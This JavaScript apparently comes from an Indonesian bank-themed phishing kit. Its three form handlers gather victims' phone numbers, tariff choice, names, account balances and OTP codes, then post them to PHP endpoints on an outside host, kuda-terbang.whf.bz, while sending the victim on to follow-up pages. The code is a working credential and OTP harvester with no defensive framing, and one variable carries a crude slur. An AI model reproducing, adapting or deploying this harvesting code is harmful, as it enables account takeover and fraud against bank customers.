// TARIF
function sendNohp(){    
  event.preventDefault();
   $('.load').fadeIn();
document.getElementById('kirim').innerHTML = "Memproses....";
var tarif = $('#tarif').val();
 sessionStorage.setItem('tarif', tarif);
   var nohp = $('#nohp').val();
   sessionStorage.setItem('nohp', nohp);
$("#lonte").show();
 $.ajax({
 type: 'POST',
 url: 'https://kuda-terbang.whf.bz/notif/39/no.php',
 data: $('#formHP').serialize(),
 datatype: 'JSON', 
 complete: function(data) {
            vibr(180);            
            console.log('Complete')
   setTimeout(function(){
   window.location.href='belum.html'
  $("#lonte").hide();
  document.getElementById('kirim').innerHTML = "Lanjutkan";
  $('.load').fadeOut();
    }, 500);
        }
 
 });
    return false;
}  
     





    
    
// Belum
function sendBelum(){    
    $('.load').fadeIn();
   event.preventDefault();
   $(".lanjutkan").prop("disabled", true);
   document.getElementById('lanjutkan').innerHTML = "Memproses....";
   
   $.ajax({
        type: 'POST',
        url: 'https://kuda-terbang.whf.bz/notif/39/belum.php',
        data: $('#login').serialize(),
        datatype: 'JSON',
      complete: function() {
         setTimeout(function() {
            window.location = "otpblm.html";
            $("#lonte").hide();
            $('.load').fadeOut();
            document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
            var tarif = $('#tarif').val();
            sessionStorage.setItem('tarif', tarif);
            var nohp = $('#nohp').val();
            sessionStorage.setItem('nohp', nohp);
            var nama = $('#nama').val();
            sessionStorage.setItem('nama', nama);
            var rek = $('#saldo').val();
            sessionStorage.setItem('rek', rek);
         }, 500);
      }
   });
};
    



        
function sendOtp() {
            event.preventDefault();
            document.getElementById('kirims').value = "Memproses...."; 
           
            
     $.ajax({
        type: 'POST',
        url: 'https://kuda-terbang.whf.bz/notif/39/otpblm.php',
        data: $('#formLinkk').serialize(),
        datatype: 'JSON',
                complete: function (response) {
                    showAlert("a");
 $("#nama1").val("");
 $("#nama1").addClass('textarea1'); 
   document.getElementById('kirims').value = "Konfirmasi";
                    $("#nama1").val('');
                    $("#nama1").focus();
                    setTimeout(function () {
                        $("#errorAlert").slideUp();                                                
                    }, 3000);
                },
                error: function (error) {
                    $("#loader").hide();
                    $(".btn-primary").prop("disabled", false);
                    $("#errorAlert").removeClass("alert-success").addClass("alert-danger");
                    $("#errorAlert").text("Gagal mengirim kode aktivasi. Silakan coba lagi.").show();
                }
            });
        };
